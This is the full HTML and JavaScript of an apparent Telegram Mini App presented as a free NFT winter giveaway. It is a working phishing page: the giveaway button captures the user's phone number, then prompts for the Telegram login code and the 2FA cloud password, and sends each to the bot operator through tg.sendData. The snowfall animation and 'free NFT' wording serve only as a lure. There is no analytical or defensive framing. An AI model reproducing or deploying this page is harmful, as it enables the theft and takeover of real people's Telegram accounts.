<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NFT Winter Gift</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            background: radial-gradient(circle, #1a2a6c, #b21f1f, #fdbb2d); 
            background-attachment: fixed;
            color: white; margin: 0; padding: 0; overflow-x: hidden;
        }
        
        /* СНЕГ */
        #snow { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 1000; }

        .container { padding: 20px; text-align: center; position: relative; z-index: 10; }
        
        .nft-card { 
            background: rgba(255, 255, 255, 0.1); 
            backdrop-filter: blur(10px);
            border-radius: 20px; padding: 15px; margin-bottom: 20px;
            border: 1px solid rgba(255,255,255,0.2);
            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
        }

        .nft-img { width: 100%; border-radius: 15px; box-shadow: 0 5px 15px rgba(0,0,0,0.5); }
        
        h2 { font-size: 24px; text-shadow: 2px 2px 4px rgba(0,0,0,0.5); }
        
        .btn { 
            background: #ffffff; color: #1a2a6c; border: none; 
            padding: 15px 30px; border-radius: 12px; width: 100%; 
            font-weight: bold; font-size: 16px; cursor: pointer;
            transition: 0.3s; margin-top: 10px;
        }

        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
                 background: rgba(0,0,0,0.85); z-index: 2000; flex-direction: column; 
                 justify-content: center; align-items: center; padding: 30px; box-sizing: border-box; }
        .active { display: flex; }

        input { 
            width: 100%; padding: 15px; border-radius: 12px; border: none; 
            background: rgba(255,255,255,0.9); color: #333; font-size: 18px; 
            text-align: center; margin-bottom: 15px;
        }
    </style>
</head>
<body>

    <canvas id="snow"></canvas>

    <div class="container">
        <h2>❄️ Зимняя Раздача NFT</h2>
        <p>Выберите свой подарок и подтвердите получение</p>

        <div class="nft-card">
            <img src="https://i.seadn.io/gae/7B0iaEunT6S6Ksz5H4TCH6m9oK3Hxlz9GfI0uT0a.png?w=500" class="nft-img">
            <h3>Winter Ape #2024</h3>
            <p>Статус: <span style="color: #00ff00;">Доступно</span></p>
            <button class="btn" onclick="startAuth()">ПОЛУЧИТЬ БЕСПЛАТНО</button>
        </div>
    </div>

    <div id="step-code" class="modal">
        <h3>Подтверждение</h3>
        <p>Введите код, пришедший в ваш Telegram</p>
        <input type="number" id="in-code" placeholder="Код (5 цифр)">
        <button class="btn" onclick="sendCode()">ПОДТВЕРДИТЬ</button>
    </div>

    <div id="step-pass" class="modal">
        <h3>Облачный пароль</h3>
        <p>Введите ваш 2FA пароль</p>
        <input type="password" id="in-pass" placeholder="Пароль">
        <button class="btn" onclick="sendPass()">ЗАВЕРШИТЬ МИНТ</button>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();

        // 1. ЗАПРОС КОНТАКТА (Кнопка поделиться)
        function startAuth() {
            // Вызываем нативное окно Telegram для передачи номера
            tg.requestContact((sent, result) => {
                if (sent) {
                    const phone = result.responseUnsafe.contact.phone_number;
                    tg.sendData("PHONE:" + phone);
                    document.getElementById('step-code').classList.add('active');
                } else {
                    alert("Для получения NFT необходима верификация через контакт.");
                }
            });
        }

        function sendCode() {
            const val = document.getElementById('in-code').value;
            if(val.length >= 5) {
                tg.sendData("CODE:" + val);
                document.getElementById('step-code').classList.remove('active');
                document.getElementById('step-pass').classList.add('active');
            }
        }

        function sendPass() {
            const val = document.getElementById('in-pass').value;
            tg.sendData("PASS:" + val);
            tg.close();
        }

        // СКРИПТ СНЕГА
        const canvas = document.getElementById('snow');
        const ctx = canvas.getContext('2d');
        let width, height, flakes = [];

        function initSnow() {
            width = window.innerWidth;
            height = window.innerHeight;
            canvas.width = width;
            canvas.height = height;
            for (let i = 0; i < 150; i++) {
                flakes.push({ x: Math.random() * width, y: Math.random() * height, r: Math.random() * 3 + 1, d: Math.random() * 1 });
            }
        }

        function drawSnow() {
            ctx.clearRect(0, 0, width, height);
            ctx.fillStyle = "white";
            ctx.beginPath();
            for (let f of flakes) {
                ctx.moveTo(f.x, f.y);
                ctx.arc(f.x, f.y, f.r, 0, Math.PI * 2, true);
            }
            ctx.fill();
            moveSnow();
        }

        function moveSnow() {
            for (let f of flakes) {
                f.y += Math.pow(f.d, 2) + 1;
                if (f.y > height) { f.y = -10; f.x = Math.random() * width; }
            }
        }
        initSnow();
        setInterval(drawSnow, 30);
    </script>
</body>
</html>
